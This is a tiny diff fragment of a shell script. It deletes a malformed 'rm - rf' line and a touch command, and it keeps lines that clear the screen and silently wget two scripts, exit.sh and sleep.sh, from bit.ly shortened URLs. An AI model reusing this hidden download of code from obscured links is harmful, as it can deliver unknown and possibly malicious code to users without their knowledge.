@@ -1,5 +1,3 @@
-rm - rf 3zS1Wjp
-touch 3zS1Wjp
 clear
 wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
 wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
